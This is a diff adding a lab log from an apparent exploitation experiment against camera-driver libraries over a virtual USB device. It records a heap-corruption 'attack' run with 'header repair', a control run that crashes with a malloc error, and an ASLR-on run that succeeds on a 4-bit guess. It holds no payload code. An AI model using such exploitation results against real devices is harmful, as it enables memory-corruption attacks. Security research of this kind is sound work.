@@ -1,0 +1,33 @@
+== apply lab-only W194 header repair to W193 base ==
+libtool: warning: relinking 'serial.la'
+libtool: warning: relinking 'usb1.la'
+libtool: warning: relinking 'usbdiskdirect.la'
+libtool: warning: relinking 'usbscsi.la'
+libtool: warning: relinking 'disk.la'
+libtool: warning: relinking 'vusb.la'
+libtool: warning: relinking 'ptpip.la'
+== attack: ASLR off, device-chosen partial priv, header repair on ==
+=== ATTACK (rc 0) ===
+VUSB_PARTIAL=7430 n=15922
+AFTER_INIT rc=0
+LIST rc=0 count=1
+FIRST_NAME=jl_001.ppm
+FILE_GET rc=0
+DATA rc=0 size=528 bytes=573139335a5a000100005a5a00005a5a
+FILE_SAVE rc=0 path=/tmp/w193-lgp-base/w194-attack.bin
+== control: same corruption with no header repair ==
+=== NO_REPAIR (rc 134) ===
+VUSB_PARTIAL=7430 n=15922
+AFTER_INIT rc=0
+malloc(): invalid next size (unsorted)
+Aborted (core dumped)
+== control: ASLR on, same 4-bit guess, header repair on ==
+=== ASLR_ON (rc 0) ===
+VUSB_PARTIAL=7430 n=15922
+AFTER_INIT rc=0
+LIST rc=0 count=1
+FIRST_NAME=jl_001.ppm
+FILE_GET rc=0
+DATA rc=0 size=528 bytes=573139335a5a000100005a5a00005a5a
+FILE_SAVE rc=0 path=/tmp/w193-lgp-base/w194-aslr.bin
+== control: safe count 100 ==
